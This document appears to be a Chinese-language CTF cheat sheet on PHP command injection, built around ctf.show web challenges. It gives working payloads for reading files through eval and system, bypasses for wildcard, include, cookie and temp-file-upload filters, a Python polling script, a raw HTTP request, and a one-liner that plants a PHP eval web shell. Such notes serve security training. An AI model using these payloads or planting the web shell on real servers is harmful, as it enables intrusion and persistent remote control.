
**用eval执行Linux命令**

## eval执行（注意需加分号）

注入方式例如:/?cmd=system('ls')

request = post + get

- system()
	对某些指令进行执行的函数，比如：ls、cat、whoami、ifconfig等指令

- passthru()
	与system用法基本一致，在system函数被过滤后考虑使用

- exec() 
- shell_exec() 
- popen() 
- proc_open() 
- pcntl_exec()
- 反引号
- nl
	相当于带行号输出的cat

用find命令找flag文件
```
find / -name flag.txt
```

**常用payload**

```
echo `nl flag.php`；

system()

passthru()

echo`strings%09f*`;

```

**配合文件包含**

```
用文件包含include()，include可以无括号包含，分号`;`可以用`?>`代替，与前面形成闭合，这样就可以做到参数逃逸

c=include%09$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php

?c=include%09$_GET[a]?>&a=data://,<?php eval(system('cat flag.php'));?>

传参时不能用双引号
```

# PHP短标签

```
<?=$a?>
<?=(表达式)?> 
就相当于 
<?php echo $a?> 
<?php echo (表达式)?>

(注意：这种写法在php配置中默认关闭了的,如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。)
```

**通过cookie命令执行**

```
c=session_start();system(session_id());
passid=ls
```

**RCE中的文件上传**

```
可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母（可以通过linux的匹配符去匹配）

可以利用[@-[]来表示大写字母(根据ascaii码表知)

```

```
python脚本：
import time  
import requests  
while True:  
    url = "http://08a7398b-fabd-4c83-a422-757d93257172.challenge.ctf.show/?c=.+/???/????????[@-[]"  
    r = requests.post(url, files={"file": ('a.php', 'ls')})  
    print(r.text)  
    time.sleep(5)

```

```
html页面：
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://159af485-d8fb-4eb2-944e-e95454f5e3ee.challenge.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

```
发包 c=.%20/???/????????[@-[]  通配符匹配 用 . 执行该临时文件  

POST /?c=.%20/???/????????[@-[] HTTP/1.1
Host: 159af485-d8fb-4eb2-944e-e95454f5e3ee.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/
Content-Type: multipart/form-data; boundary=---------------------------9168694222459686997478056601
Content-Length: 366
Origin: http://127.0.0.1
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------9168694222459686997478056601
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/octet-stream

#!/bin/sh
cat flag.php
-----------------------------9168694222459686997478056601
Content-Disposition: form-data; name="submit"

鎻愪氦
-----------------------------9168694222459686997478056601--

```


##### Windows系统支持的管道符如下：

1. “|”：直接执行后面的语句。
2. “||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。
3. “&”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。
4. “&&”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真
5. /

##### Linux系统支持的管道符如下：

1. “;”：执行完前面的语句再执行后面的语句。
2. “|”：显示后面语句的执行结果。
3. “||”：当前面的语句执行出错时，执行后面的语句。
4. “&”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。
5. “&&”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行
6. /

#### 思路一：直接通过管道符拼接，使用命令查看flag

#### 思路二：通过重定向，向服务器注入一句话木马，获得shell,再用蚁剑连接
```
127.0.0.1&echo -e "<?php @eval($_POST['shell']);?>" > shell.php
```



# 绕过姿势

**引用绕过**
```
c=eval($_GET[a]);&a=system('cat flag.php');

当第一次传c时，c只是字符串，而eval之后变成了语句，则可传入a
```

**通配符绕过**
```
c=echo(`nl%09fl[abc]*`);

c=echo`strings%09f*`;

?
*

f????(最好用)
```

**运算绕过**
```

当大量字符被过滤时，通过PHP的与或非用大量不被过滤的字符构造字符进行绕过（按位与或非）

建议不要用hackerbar发

发送语句(system)(ls)
		system cat flag.php
```
[ctfshow web入门 web41_ctfshow web41_yu22x的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/108569080)
[[CTFSHOW]命令执行_Y4tacker的博客-CSDN博客](https://blog.csdn.net/solitudi/article/details/109837640?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169004083716800180635944%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=169004083716800180635944&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-109837640-null-null.268^v1^koosearch&utm_term=ctfshow&spm=1018.2226.3001.4450)

**等价注释**
```
在linux中shell脚本，可用%0a进行换行，相当于把后面的命令换行，即使命令失效

也可用`||`,在linux中A||B,A执行成功就不会执行B

也可%26（可以但未知道原理）
```

**字母被过滤**
```
?c=/bin/base64 flag.php

?c=/???/????64 ????.???
```

